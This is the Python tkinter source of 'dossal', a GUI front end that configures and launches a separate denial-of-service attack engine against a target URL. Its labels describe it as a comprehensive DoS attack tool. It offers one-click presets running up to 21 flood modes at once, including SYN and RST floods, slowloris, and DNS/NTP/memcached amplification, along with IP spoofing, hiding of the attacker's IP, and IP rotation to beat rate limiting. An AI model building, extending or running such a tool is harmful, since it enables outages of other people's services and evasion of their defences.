#!/usr/bin/env python3
"""
dossal v4.0 — GUI DoS Attack Tool (Windows-first, cross-platform)
Requires: Python 3.8+, h2 (pip install h2)
Run: python dossal_gui.py
"""
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import threading, json, time, sys, os, subprocess, re

# Import dossal engine
try:
    import dossal
except ImportError:
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    import dossal

class DossalGUI:
    """dossal GUI 메인 클래스 (tkinter)."""
    def __init__(self, root):
        """dossal GUI 초기화 (tkinter)."""
        self.root = root
        root.title("dossal v4.4 — 종합 DoS 공격 도구")
        root.geometry("600x500")
        root.resizable(True, True)
        
        self.attack_thread = None
        self.running = False
        self.stats = {'rps': 0, 'pps': 0, 'conns': 0, 'errors': 0, 'packets': 0, 'requests': 0}
        self.start_time = 0
        self.duration = 10
        
        self._build_ui()
    
    # 모드별 사양 정보
    MODE_SPECS = {
        'power': {
            'desc': 'combo(raw+udp+syn)',
            'min': '4코어 / 4GB RAM / 100Mbps',
            'rec': '8코어 / 16GB RAM / 500Mbps',
            'predict': '~50k RPS (8코어 기준)',
        },
        'stealth': {
            'desc': 'auto + 스푸핑 100 + 자동회복',
            'min': '4코어 / 4GB RAM / 100Mbps',
            'rec': '8코어 / 16GB RAM / 500Mbps',
            'predict': '~10k RPS (429 우회)',
        },
        'speed': {
            'desc': 'raw 단일 모드',
            'min': '8코어 / 8GB RAM / 500Mbps',
            'rec': '16코어 / 16GB RAM / 1Gbps',
            'predict': '~140k RPS (16코어 기준)',
        },
        'super': {
            'desc': '21개 모드 동시 + 스텔스 + 스푸핑 + 자동회복',
            'min': '8코어 / 8GB RAM / 500Mbps',
            'rec': '16코어 / 8GB+ RAM / 500Mbps+ (프로세스 16)',
            'predict': '~300k RPS + 300k PPS (16코어 기준)',
        },
    }

    def _apply_preset(self):
        """인텐시트 프리셋 적용 + 사양 정보 표시."""
        preset = self.preset_var.get()
        if preset == 'power':
            self.fast_var.set(True)
            self.spoof_var.set(False)
            self.stealth_var.set(False)
            self.recovery_var.set(False)
            self.threads_var.set('24')
            self.mode_var.set('combo')
        elif preset == 'stealth':
            self.fast_var.set(True)
            self.spoof_var.set(True)
            self.stealth_var.set(True)
            self.recovery_var.set(True)
            self.threads_var.set('8')
            self.mode_var.set('auto')
        elif preset == 'speed':
            self.fast_var.set(True)
            self.spoof_var.set(False)
            self.stealth_var.set(False)
            self.recovery_var.set(False)
            self.threads_var.set('32')
            self.mode_var.set('raw')
        elif preset == 'super':
            self.fast_var.set(False)
            self.spoof_var.set(True)
            self.stealth_var.set(True)
            self.recovery_var.set(True)
            self.threads_var.set('16')
            self.mode_var.set('auto')
            self.combo_var.set('super')

        # 사양 정보 로그 출력
        specs = self.MODE_SPECS.get(preset)
        if specs:
            self.log(f"[프리셋] {specs['desc']}")
            self.log(f"  최소: {specs['min']}")
            self.log(f"  권장: {specs['rec']}")
            self.log(f"  예측: {specs['predict']}")
    
    """UI 레이아웃 구성 (tkinter)."""
    def _detect_pc_specs(self):
        """PC 사양 자동 감지 + 권장 옵션 적용."""
        import os
        import platform
        
        # CPU 코어 수
        try:
            cores = os.cpu_count() or 4
        except:
            cores = 4
        
        # RAM 감지 (Mac/Windows/Linux)
        ram_gb = 8  # 기본값
        try:
            if platform.system() == 'Darwin':
                # macOS: sysctl hw.memsize
                import subprocess
                r = subprocess.run(['sysctl', '-n', 'hw.memsize'], capture_output=True, text=True, timeout=3)
                if r.returncode == 0:
                    ram_gb = int(r.stdout.strip()) // (1024 ** 3)
            elif platform.system() == 'Windows':
                # Windows: WMI
                r = subprocess.run(['wmic', 'computersystem', 'get', 'TotalPhysicalMemory'], capture_output=True, text=True, timeout=3)
                if r.returncode == 0:
                    lines = r.stdout.strip().split('\n')
                    if len(lines) > 1:
                        ram_gb = int(lines[1].strip()) // (1024 ** 3)
            else:
                # Linux: /proc/meminfo
                with open('/proc/meminfo') as f:
                    for line in f:
                        if line.startswith('MemTotal:'):
                            ram_gb = int(line.split()[1]) // (1024 ** 2)
                            break
        except:
            ram_gb = 8
        
        # OS 정보
        os_name = platform.system()
        os_ver = platform.version()[:10]
        
        # 권장 옵션 결정
        if cores >= 16 and ram_gb >= 16:
            recommended = 'super'
            threads = 16
            message = f"💪 강력한 PC! SUPER 모드 권장 (16 프로세스)"
        elif cores >= 8 and ram_gb >= 8:
            recommended = 'super'
            threads = 16
            message = f"✅ 좋은 PC! SUPER 모드 가능 (16 프로세스)"
        elif cores >= 4 and ram_gb >= 4:
            recommended = 'power'
            threads = 8
            message = f"⚠️ 기본 PC — 최대 전력 모드 권장 (8 프로세스)"
        else:
            recommended = 'speed'
            threads = 4
            message = f"📉 저사양 PC — 스피드 모드 권장 (4 프로세스)"
        
        # UI에 적용
        self.preset_var.set(recommended)
        self.threads_var.set(str(threads))
        self._apply_preset()
        
        # 로그에 표시
        self.log(f"📋 PC 사양: {cores}코어 / {ram_gb}GB RAM / {os_name} {os_ver}")
        self.log(f"  → {message}")
        self.log(f"  → 권장 옵션: {recommended} ({threads} 프로세스)")
        
        return {'cores': cores, 'ram_gb': ram_gb, 'os': os_name}
    
    def _build_ui(self):
        """GUI 레이아웃 생성 (모드/옵션/차트/로그)."""
        # PC 사양 감지
        self.pc_specs = self._detect_pc_specs()
        
        # Main frame
        main = ttk.Frame(self.root, padding=10)
        main.pack(fill=tk.BOTH, expand=True)
        
        # Target section
        target_frame = ttk.LabelFrame(main, text="🎯 대상", padding=10)
        target_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(target_frame, text="URL:", font=('', 10, 'bold')).grid(row=0, column=0, sticky=tk.W)
        ttk.Label(target_frame, text="공격할 웹사이트/서버 주소", foreground='#888').grid(row=0, column=2, sticky=tk.E, padx=5)
        self.url_var = tk.StringVar(value="http://target.com:80")
        self.url_entry = ttk.Entry(target_frame, textvariable=self.url_var, width=50)
        self.url_entry.grid(row=0, column=1, columnspan=2, padx=5, sticky=tk.EW)
        
        ttk.Label(target_frame, text="시간(초):", font=('', 10, 'bold')).grid(row=1, column=0, sticky=tk.W, pady=5)
        ttk.Label(target_frame, text="공격 지속 시간 (기본 600초 = 10분, 짧게는 10초, 길게는 3600초)", foreground='#888').grid(row=1, column=2, sticky=tk.E, padx=5)
        self.dur_var = tk.StringVar(value="600")
        self.dur_entry = ttk.Entry(target_frame, textvariable=self.dur_var, width=10)
        self.dur_entry.grid(row=1, column=1, sticky=tk.W, pady=5)
        
        # Profile presets (ONE-CLICK)
        preset_frame = ttk.LabelFrame(main, text="⚡ 원클릭 프리셋", padding=10)
        preset_frame.pack(fill=tk.X, pady=5)
        
        self.preset_var = tk.StringVar(value="super")
        ttk.Radiobutton(preset_frame, text="💥 SUPER (파워+스텔스+스피드 = 21모드 동시)", variable=self.preset_var, value="super", command=self._apply_preset).grid(row=0, column=0, columnspan=3, sticky=tk.W, pady=2)
        ttk.Radiobutton(preset_frame, text="🔥 최대 전력 (최강)", variable=self.preset_var, value="power", command=self._apply_preset).grid(row=1, column=0, columnspan=3, sticky=tk.W, pady=2)
        ttk.Radiobutton(preset_frame, text="🕵️ 스텔스 (IP 숨김 + 스푸핑 + 자동회복)", variable=self.preset_var, value="stealth", command=self._apply_preset).grid(row=2, column=0, columnspan=3, sticky=tk.W, pady=2)
        ttk.Radiobutton(preset_frame, text="⚡ 스피드 (최대 RPS)", variable=self.preset_var, value="speed", command=self._apply_preset).grid(row=3, column=0, columnspan=3, sticky=tk.W, pady=2)
        
        # Advanced options (collapsible)
        opt_frame = ttk.LabelFrame(main, text="⚙️ 고급 옵션", padding=10)
        opt_frame.pack(fill=tk.X, pady=5)
        
        self.fast_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(opt_frame, text="자동 모드 (최적 공격 자동 선택)", variable=self.fast_var).grid(row=0, column=0, columnspan=2, sticky=tk.W)
        
        self.spoof_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(opt_frame, text="스푸핑 IP 사용 (100개)", variable=self.spoof_var).grid(row=1, column=0, columnspan=2, sticky=tk.W, pady=2)
        
        self.stealth_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(opt_frame, text="스텔스 (실제 IP 숨김)", variable=self.stealth_var).grid(row=2, column=0, columnspan=2, sticky=tk.W, pady=2)
        
        self.recovery_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(opt_frame, text="자동회복 (429 감지 → IP 교체)", variable=self.recovery_var).grid(row=3, column=0, columnspan=2, sticky=tk.W, pady=2)
        
        self.threads_var = tk.StringVar(value="16")
        ttk.Label(opt_frame, text="프로세스 수:").grid(row=4, column=0, sticky=tk.W, pady=2)
        ttk.Entry(opt_frame, textvariable=self.threads_var, width=10).grid(row=4, column=1, sticky=tk.W, pady=2)
        
        # Multi-target
        self.targets_var = tk.StringVar(value="")
        ttk.Label(opt_frame, text="추가 대상 (쉼표):").grid(row=5, column=0, sticky=tk.W, pady=2)
        ttk.Entry(opt_frame, textvariable=self.targets_var, width=40).grid(row=5, column=1, columnspan=2, sticky=tk.EW, pady=2)
        
        # Proxy (optional)
        self.proxy_var = tk.StringVar(value="")
        ttk.Label(opt_frame, text="프록시:").grid(row=6, column=0, sticky=tk.W, pady=2)
        ttk.Entry(opt_frame, textvariable=self.proxy_var, width=40).grid(row=6, column=1, columnspan=2, sticky=tk.EW, pady=2)
        
        # Mode selection (optional, auto if Fast Mode)
        self.mode_var = tk.StringVar(value="auto")
        ttk.Label(opt_frame, text="모드 (auto = 자동):").grid(row=7, column=0, sticky=tk.W, pady=2)
        mode_combo = ttk.Combobox(opt_frame, textvariable=self.mode_var, width=30,
                                    values=['auto', 'raw', 'httpsmp', 'https', 'http', 'h2', 'h2mp', 'h3mp', 'grpc', 'grpcmp', 'quic', 'udp', 'tcp', 'syn', 'synack', 'rst', 'fin', 'websocket', 'wsm', 'slowloris', 'dns', 'icmp', 'ssdp', 'ntp', 'memcached'])
        mode_combo.grid(row=7, column=1, sticky=tk.W, pady=2)
        
        # Combo attack
        ttk.Label(opt_frame, text="조합:").grid(row=8, column=0, sticky=tk.W, pady=2)
        combo_frame = ttk.Frame(opt_frame)
        combo_frame.grid(row=8, column=1, sticky=tk.W, pady=2)
        self.combo_var = tk.StringVar(value="")
        ttk.Radiobutton(combo_frame, text="없음", variable=self.combo_var, value="").pack(side=tk.LEFT, padx=2)
        ttk.Radiobutton(combo_frame, text="웹", variable=self.combo_var, value="web").pack(side=tk.LEFT, padx=2)
        ttk.Radiobutton(combo_frame, text="TLS", variable=self.combo_var, value="tls").pack(side=tk.LEFT, padx=2)
        ttk.Radiobutton(combo_frame, text="확대", variable=self.combo_var, value="amplify").pack(side=tk.LEFT, padx=2)
        ttk.Radiobutton(combo_frame, text="전체", variable=self.combo_var, value="full").pack(side=tk.LEFT, padx=2)
        ttk.Radiobutton(combo_frame, text="⚡슈퍼", variable=self.combo_var, value="super").pack(side=tk.LEFT, padx=2)
        
        # Buttons
        btn_frame = ttk.Frame(main)
        btn_frame.pack(fill=tk.X, pady=10)
        
        self.start_btn = ttk.Button(btn_frame, text="▶️ 공격 시작", command=self.start_attack)
        self.start_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_btn = ttk.Button(btn_frame, text="⏹️ 중단", command=self.stop_attack, state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=5)
        
        ttk.Button(btn_frame, text="📊 시뮬레이션", command=self.dry_run).pack(side=tk.LEFT, padx=5)
        
        ttk.Button(btn_frame, text="불러오기", command=self.load_profile).pack(side=tk.RIGHT, padx=2)
        ttk.Button(btn_frame, text="저장하기", command=self.save_profile).pack(side=tk.RIGHT, padx=2)
        ttk.Button(btn_frame, text="리포트", command=self.save_report).pack(side=tk.RIGHT, padx=2)
        
        # Progress bar
        self.progress = ttk.Progressbar(main, orient=tk.HORIZONTAL, length=400, mode='determinate')
        self.progress.pack(fill=tk.X, pady=5)
        
        # Stats frame
        stats_frame = ttk.LabelFrame(main, text="📈 실시간 통계", padding=5)
        stats_frame.pack(fill=tk.X, pady=5)
        
        self.rps_label = ttk.Label(stats_frame, text="요청/초: 0", font=('Consolas', 10))
        self.rps_label.pack(side=tk.LEFT, padx=10)
        
        self.pps_label = ttk.Label(stats_frame, text="패킷/초: 0", font=('Consolas', 10))
        self.pps_label.pack(side=tk.LEFT, padx=10)
        
        self.conns_label = ttk.Label(stats_frame, text="연결: 0", font=('Consolas', 10))
        self.conns_label.pack(side=tk.LEFT, padx=10)
        
        self.err_label = ttk.Label(stats_frame, text="에러: 0", font=('Consolas', 10))
        self.err_label.pack(side=tk.LEFT, padx=10)
        
        # Live chart (RPS/PPS real-time)
        chart_frame = ttk.LabelFrame(main, text="📊 실시간 차트", padding=5)
        chart_frame.pack(fill=tk.X, pady=5)
        self.chart = tk.Canvas(chart_frame, height=100, bg='#1a1a2e', highlightthickness=0)
        self.chart.pack(fill=tk.X)
        self._chart_data_rps = []
        self._chart_data_pps = []
        self._chart_max = 1
        self._chart_window = 60  # 60 data points
        
        # Log
        log_frame = ttk.LabelFrame(main, text="📋 로그", padding=5)
        log_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        self.log_text = scrolledtext.ScrolledText(log_frame, height=8, font=('Consolas', 9))
        self.log_text.pack(fill=tk.BOTH, expand=True)
    
    """로그 메시지 출력."""
    def log(self, msg):
        """로그 메시지 출력 (타임스탬프 포함)."""
        timestamp = time.strftime("%H:%M:%S")
        self.log_text.insert(tk.END, f"[{timestamp}] {msg}\n")
        self.log_text.see(tk.END)
        self.log_text.update()
    
    """공격 시작 (dossal.py subprocess 실행)."""
    def start_attack(self):
        """공격 시작 (URL 검증 + 공격 실행)."""
        if self.running:
            return
        
        url = self.url_var.get().strip()
        if not url:
            messagebox.showerror("Error", "Enter a target URL")
            return
        
        try:
            duration = int(self.dur_var.get())
        except:
            duration = 10
        
        try:
            threads = int(self.threads_var.get())
        except:
            threads = 8
        
        mode = self.mode_var.get()
        fast = self.fast_var.get()
        spoof = self.spoof_var.get()
        stealth = self.stealth_var.get()
        recovery = self.recovery_var.get()
        
        # Build command
        cmd = [sys.executable, os.path.join(os.path.dirname(os.path.abspath(__file__)), 'dossal.py')]
        cmd.extend(['--url', url, '--duration', str(duration), '--threads', str(threads)])
        
        combo = self.combo_var.get()
        if combo:
            cmd.extend(['--combo', combo])
        elif fast:
            cmd.append('--auto')
        elif mode != 'auto':
            cmd.extend(['--mode', mode])
        
        if spoof:
            cmd.extend(['--spoof', '100'])
        if stealth:
            cmd.append('--stealth')
        if recovery:
            cmd.append('--recovery')
        
        proxy = self.proxy_var.get().strip()
        if proxy:
            cmd.extend(['--proxy', proxy])
        
        targets = self.targets_var.get().strip()
        if targets:
            cmd.extend(['--targets', targets])
        
        self.running = True
        self.start_time = time.time()
        self.duration = duration
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.progress.config(maximum=duration, value=0)
        
        self.log(f"Starting attack: {url}")
        self.log(f"Mode: {mode if not fast else 'auto'} | Threads: {threads} | Duration: {duration}s")
        if spoof:
            self.log("Spoofed IPs: 100")
        if stealth:
            self.log("Stealth: ON")
        if recovery:
            self.log("Recovery: ON")
        
        self.attack_thread = threading.Thread(target=self._run_attack, args=(cmd,), daemon=True)
        self.attack_thread.start()
        
        self._update_stats()
    
    """공격 백그라운드 실행 + live stats 파싱."""
    def _run_attack(self, cmd):
        """백그라운드 스레드에서 dossal CLI 실행 + 실시간 스탯 수집."""
        try:
            # Add --live for real-time stats
            cmd = cmd + ['--live']
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            # Read stdout line by line for live stats
            for line in (proc.stdout or []):
                line = line.strip()
                if not line:
                    continue
                # Live stats line: [30s] RPS=12345 PPS=67890 CONNS=8 ERR=0 429_IP=5 ACTIVE=95/100
                if line.startswith('[') and 'RPS=' in line:
                    # Parse live stats
                    import re
                    rps_m = re.search(r'RPS=([\d,]+)', line)
                    pps_m = re.search(r'PPS=([\d,]+)', line)
                    conns_m = re.search(r'CONNS=(\d+)', line)
                    err_m = re.search(r'ERR=(\d+)', line)
                    ip429_m = re.search(r'429_IP=(\d+)', line)
                    active_m = re.search(r'ACTIVE=(\d+)/(\d+)', line)
                    
                    if rps_m:
                        self.stats['rps'] = int(rps_m.group(1).replace(',', ''))
                    if pps_m:
                        self.stats['packets'] = int(pps_m.group(1).replace(',', ''))
                    if conns_m:
                        self.stats['connections_made'] = int(conns_m.group(1))
                    if err_m:
                        self.stats['errors'] = int(err_m.group(1))
                    if ip429_m:
                        self.stats['429_ips'] = int(ip429_m.group(1))
                    if active_m:
                        self.stats['active_ips'] = f"{active_m.group(1)}/{active_m.group(2)}"  # type: ignore
                    
                    self.log(f"Live: RPS={self.stats.get('rps',0):,} PPS={self.stats.get('packets',0):,} 429_IP={self.stats.get('429_ips',0)}")
                    self.root.after(0, self._update_stats)
                elif line.startswith('{'):
                    # Final JSON result
                    try:
                        data = json.loads(line)
                        self.stats.update(data)
                        self.log(f"Complete: {data.get('rps', 0):,.0f} RPS, {data.get('packets', 0):,} packets")
                    except:
                        pass
            
            proc.wait()
            
        except Exception as e:
            self.log(f"Error: {e}")
        finally:
            self.running = False
            self.root.after(0, self._on_complete)
    
    """공격 완료 핸들러."""
    def _on_complete(self):
        """공격 완료 처리 (버튼 리셋 + 리포트 저장)."""
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.progress.config(value=self.duration)
        self.log("Attack finished")
    
    def dry_run(self):
        """공격 없이 시뮬레이션 (패킷 수/시간/영향력 예측)."""
        url = self.url_var.get().strip()
        if not url:
            messagebox.showerror("Error", "Enter a target URL")
            return
        
        cmd = [sys.executable, os.path.join(os.path.dirname(os.path.abspath(__file__)), 'dossal.py')]
        cmd.extend(['--url', url, '--dry-run'])
        
        if self.stealth_var.get() or self.spoof_var.get():
            cmd.extend(['--spoof', '100'])
        if self.stealth_var.get():
            cmd.append('--stealth')
        if self.recovery_var.get():
            cmd.append('--recovery')
        
        self.log("Running simulation...")
        threading.Thread(target=self._run_dry, args=(cmd,), daemon=True).start()
    
    """Dry-run 백그라운드 실행."""
    def _run_dry(self, cmd):
        """dry-run 출력 파싱 (백그라운드 스레드)."""
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
            for line in proc.stderr.split('\n'):
                if line.strip():
                    self.log(line.strip())
            self.log("Simulation complete")
        except Exception as e:
            self.log(f"Simulation error: {e}")
    
    """공격 중단 (subprocess terminate)."""
    def stop_attack(self):
        """공격 중단 (SIGINT + 프로세스 종료)."""
        self.log("Stopping...")
        self.running = False
        # Kill the subprocess (simplified)
        # In production, send SIGTERM or use process group
    
    def _draw_chart(self):
        """실시간 RPS/PPS 차트 그리기 (60점 윈도우)."""
        # Append new data point
        self._chart_data_rps.append(self.stats.get('rps', 0))
        self._chart_data_pps.append(self.stats.get('packets', 0))
        # Keep only last N points
        if len(self._chart_data_rps) > self._chart_window:
            self._chart_data_rps.pop(0)
            self._chart_data_pps.pop(0)
        
        # Clear chart
        self.chart.delete("all")
        w = self.chart.winfo_width() or 400
        h = 100
        
        # Calculate max for scaling
        max_rps = max(self._chart_data_rps) if self._chart_data_rps else 1
        max_pps = max(self._chart_data_pps) if self._chart_data_pps else 1
        self._chart_max = max(max_rps, max_pps, 1)
        
        if not self._chart_data_rps:
            return
        
        # Draw RPS line (cyan)
        points_rps = []
        for i, v in enumerate(self._chart_data_rps):
            x = i / max(1, len(self._chart_data_rps) - 1) * w
            y = h - (v / self._chart_max) * (h - 10) - 5
            points_rps.append((x, y))
        if len(points_rps) > 1:
            flat = [coord for pt in points_rps for coord in pt]
            self.chart.create_line(flat, fill='#00d4ff', width=2)
        
        # Draw PPS line (green)
        points_pps = []
        for i, v in enumerate(self._chart_data_pps):
            x = i / max(1, len(self._chart_data_pps) - 1) * w
            y = h - (v / self._chart_max) * (h - 10) - 5
            points_pps.append((x, y))
        if len(points_pps) > 1:
            flat = [coord for pt in points_pps for coord in pt]
            self.chart.create_line(flat, fill='#00ff88', width=1)
        
        # Labels
        self.chart.create_text(5, 5, text=f"요청/초: {max_rps:,.0f}", anchor=tk.NW, fill='#00d4ff', font=('Consolas', 8))
        self.chart.create_text(100, 5, text=f"패킷/초: {max_pps:,.0f}", anchor=tk.NW, fill='#00ff88', font=('Consolas', 8))
    
    """실시간 스탯 업데이트 (RPS/PPS/429/ACTIVE)."""
    def _update_stats(self):
        """실시간 스탯 수집 (RPS/PPS/에러 + 차트/레이블 업데이트)."""
        if not self.running:
            return
        
        elapsed = time.time() - self.start_time
        progress = min(elapsed / self.duration * 100, 100)
        self.progress.config(value=progress)
        
        self.rps_label.config(text=f"요청/초: {self.stats.get('rps', 0):,.0f}")
        self.pps_label.config(text=f"패킷/초: {self.stats.get('packets', 0):,.0f}")
        self.conns_label.config(text=f"연결: {self.stats.get('connections_made', 0):,.0f}")
        self.err_label.config(text=f"에러: {self.stats.get('errors', 0):,.0f}")
        
        # Draw chart
        self._draw_chart()
        
        # Show 429 IP count if available
        if '429_ips' in self.stats:
            extra = f" 429: {self.stats['429_ips']}"
            if 'active_ips' in self.stats:
                extra += f" ACTIVE: {self.stats['active_ips']}"
            self.err_label.config(text=f"Err: {self.stats.get('errors', 0):,.0f}{extra}")
        
        self.root.after(500, self._update_stats)
    
    def save_profile(self):
        """현재 설정을 프로파일(.json)로 저장."""
        from tkinter import filedialog
        path = filedialog.asksaveasfilename(defaultextension='.json', filetypes=[("JSON", "*.json")])
        if not path:
            return
        profile = {
            'url': self.url_var.get(),
            'duration': self.dur_var.get(),
            'preset': self.preset_var.get(),
            'fast': self.fast_var.get(),
            'spoof': self.spoof_var.get(),
            'stealth': self.stealth_var.get(),
            'recovery': self.recovery_var.get(),
            'threads': self.threads_var.get(),
            'targets': self.targets_var.get(),
            'proxy': self.proxy_var.get(),
            'mode': self.mode_var.get(),
        }
        with open(path, 'w') as f:
            json.dump(profile, f, indent=2)
        self.log(f"Profile saved: {path}")
    
    def load_profile(self):
        """프로파일(.json)에서 설정 불러오기."""
        from tkinter import filedialog
        path = filedialog.askopenfilename(filetypes=[("JSON", "*.json")])
        if not path:
            return
        try:
            with open(path) as f:
                p = json.load(f)
            self.url_var.set(p.get('url', ''))
            self.dur_var.set(str(p.get('duration', '10')))
            self.preset_var.set(p.get('preset', 'power'))
            self.fast_var.set(p.get('fast', True))
            self.spoof_var.set(p.get('spoof', True))
            self.stealth_var.set(p.get('stealth', True))
            self.recovery_var.set(p.get('recovery', True))
            self.threads_var.set(str(p.get('threads', '8')))
            self.targets_var.set(p.get('targets', ''))
            self.proxy_var.set(p.get('proxy', ''))
            self.mode_var.set(p.get('mode', 'auto'))
            self.log(f"Profile loaded: {path}")
        except Exception as e:
            self.log(f"Profile error: {e}")
    
    """공격 리포트 저장 (.json)."""
    def save_report(self):
        """공격 결과 HTML 리포트 저장."""
        try:
            from tkinter import filedialog
            path = filedialog.asksaveasfilename(defaultextension='.html', filetypes=[("HTML", "*.html")])
            if path:
                with open(path, 'w') as f:
                    f.write(f"<h1>dossal Report</h1>")
                    f.write(f"<pre>{json.dumps(self.stats, indent=2)}</pre>")
                self.log(f"Report saved: {path}")
        except Exception as e:
            self.log(f"Report error: {e}")

def main():
    """dossal_gui 메인 진입점 (tkinter 루프)."""
    root = tk.Tk()
    app = DossalGUI(root)
    root.mainloop()

if __name__ == '__main__':
    main()
